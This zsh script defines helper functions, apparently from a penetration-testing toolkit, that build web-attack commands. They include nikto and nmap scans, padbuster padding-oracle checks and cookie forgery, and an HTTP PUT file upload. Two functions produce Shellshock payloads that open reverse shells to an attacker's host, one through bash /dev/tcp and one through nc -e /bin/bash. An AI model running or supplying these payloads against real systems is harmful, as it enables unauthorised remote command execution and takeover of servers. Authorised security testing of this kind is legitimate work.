#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-vuln
#############################################################

qq-enum-web-vuln-nikto() {
  __GET-URL
  print -z "nikto -C all -useragent \"${__UA}\" -h ${__URL}"
}

qq-enum-web-vuln-nmap-rfi() {
  __GET-RHOST
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
}

qq-enum-web-vuln-shellshock-cookie() {
  __GET-LHOST
  local p && read "port?LPORT: "
  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${__LHOST}/${p} 0>&1"
}

qq-enum-web-vuln-shellshock-nc() {
  __GET-LHOST
  __GET-RHOST
  local p && read "port?LPORT: "
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${p} -e /bin/bash\"' http://${r}/cgi-bin/status"
}

qq-enum-web-vuln-put-curl() {
  __GET-RHOST
  local f=$(rlwrap -S 'FILE: ' -e '' -c -o cat)
  print -z "curl -L -T ${f} http://${__RHOST}/${f}"
}

qq-enum-web-vuln-padbuster-check() {
  __GET-RHOST
  local cn && read "cn?COOKIE_NAME: "
  local cv && read "cv?COOKIE_VALUE: "
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  __GET-RHOST
  local cn && read "cn?COOKIE_NAME: "
  local cv && read "cv?COOKIE_VALUE: "
  local u && read "u?USER: "
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
}